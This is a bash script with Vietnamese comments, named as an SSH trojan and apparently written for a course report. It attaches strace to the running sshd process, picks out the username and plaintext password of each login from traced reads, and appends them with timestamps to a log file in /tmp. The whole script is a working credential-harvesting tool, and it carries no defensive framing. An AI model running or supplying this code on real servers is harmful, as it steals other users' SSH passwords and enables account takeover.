#!/bin/bash

logfile="/tmp/log_sshtrojan1.txt"

# Kiem tra ton tai file log hay khong, neu khong thi tao file log
if ! [[ -e $logfile ]];then
	touch $logfile
fi

# Bien username va password de luu lai mat khau cua nguoi dung, old_username se luu lai usename cua tai khoan vua login truoc do
username=""
password=""
old_username=""

# Tim pid cua tien trinh sshd
pid=`pgrep sshd | head -n1`

# 2 bien tren se luu 2 cau lenh ke tiep nhau ( se giai thich chi tiet trong bao cao )
tmp1=""
tmp2=""

# Strace tien trinh sshd
strace -f -p $pid -e trace=read,openat --status=successful 2>&1 | while read -r line; do
	tmp1=$tmp2
	tmp2=$line
	
	# Tim username
	if [[ $tmp2 == *'openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 5'* && $tmp1 != *'algorithm'* && $tmp1 != *'root'* && $tmp1 != *'Ubuntu'* ]];then
		username_tmp=$(echo $tmp1 | cut -d'"' -f2 | cut -d'"' -f1 | sed 's/\\[0-9]*//g' | sed 's/\\[a-z]//g' | sed -e 's/^t//')
		if ! [[ -z "$username_tmp" ]];then username=$username_tmp; fi
	fi
	
	# Tim password
	if [[ $tmp2 == *'openat(AT_FDCWD, "/etc/login.defs", O_RDONLY) = 5'* && $tmp1 != *'read(6, "f", 1)'* && $tmp1 != *'root:x:0:0:root:/root:/bin/bash'* ]]; then
		password_tmp=$(echo $tmp1 | cut -d'"' -f2 | cut -d'"' -f1 |  sed 's/\\[0-9]//g' | sed 's/\\[a-z]//g' | sed -e 's/^0[0-9]//')
		if ! [[ -z "$password_tmp" ]];then password=$password_tmp; fi
	fi
	
	# Kiem tra xem username password do co dung hay khong, luu vao file log
	if [[ $tmp2 == *'openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 5'* ]]; then
		if [[ $username != $old_username ]]; then
			echo "Time: " `date` >> $logfile
			echo "Username: " $username >> $logfile
			echo "Password: " $password >> $logfile
			old_username=$username
		fi
	fi
done

